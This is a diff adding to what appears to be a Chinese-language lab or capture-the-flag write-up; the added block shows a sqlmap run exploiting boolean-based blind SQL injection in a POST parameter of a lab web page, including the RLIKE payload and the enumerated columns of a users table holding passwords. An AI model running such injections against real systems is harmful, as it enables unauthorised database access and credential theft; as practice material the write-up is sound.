@@ -465,3 +465,86 @@ $ sqlmap -u "http://10.216.75.72/sl.php" \
  • 结果已保存至本地目录 /home/kali/.local/share/sqlmap/output/10.216.75.72。
 ```
 原因是我也不知道，问的ai，过后再复盘一下。
+```bash
+┌──(kali㉿kali)-[~/tmp/what]
+└─$ sqlmap -u "http://10.216.75.72/sl.php" \
+--method=POST \
+--data="query_id=1*" \
+--referer="http://10.216.75.72/secret.php" \
+-D forest_temple -T users \
+--columns \
+--no-cast \
+--text-only \
+--technique=B \
+--threads=3 \
+--batch
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 04:16:40 /2026-05-06/
+
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+[04:16:40] [INFO] resuming back-end DBMS 'mysql'
+[04:16:40] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: query_id=1' RLIKE (SELECT (CASE WHEN (4486=4486) THEN 1 ELSE 0x28 END))-- ccIA
+---
+[04:16:40] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.62
+back-end DBMS: MySQL unknown (MariaDB fork)
+[04:16:40] [INFO] fetching columns for table 'users' in database 'forest_temple'
+[04:16:40] [INFO] retrieved:
+[04:16:40] [WARNING] reflective value(s) found and filtering out
+4
+[04:16:40] [INFO] retrieving the length of query output
+[04:16:40] [INFO] retrieved: 2
+[04:16:40] [INFO] retrieved: id
+[04:16:40] [INFO] retrieving the length of query output
+[04:16:40] [INFO] retrieved: 7
+[04:16:40] [INFO] retrieved: int(11)
+[04:16:40] [INFO] retrieving the length of query output
+[04:16:40] [INFO] retrieved: 8
+[04:16:40] [INFO] retrieved: username
+[04:16:41] [INFO] retrieving the length of query output
+[04:16:40] [INFO] retrieved: 11
+[04:16:41] [INFO] retrieved: varchar(50)
+[04:16:41] [INFO] retrieving the length of query output
+[04:16:41] [INFO] retrieved: 8
+[04:16:41] [INFO] retrieved: password
+[04:16:41] [INFO] retrieving the length of query output
+[04:16:41] [INFO] retrieved: 12
+[04:16:41] [INFO] retrieved: varchar(255)
+[04:16:42] [INFO] retrieving the length of query output
+[04:16:41] [INFO] retrieved: 5
+[04:16:42] [INFO] retrieved: knock
+[04:16:42] [INFO] retrieving the length of query output
+[04:16:42] [INFO] retrieved: 12
+[04:16:42] [INFO] retrieved: varchar(255)
+Database: forest_temple
+Table: users
+[4 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(11)      |
+| knock    | varchar(255) |
+| password | varchar(255) |
+| username | varchar(50)  |
++----------+--------------+
+
+[04:16:42] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.216.75.72'
+[04:16:42] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 04:16:42 /2026-05-06/
+```
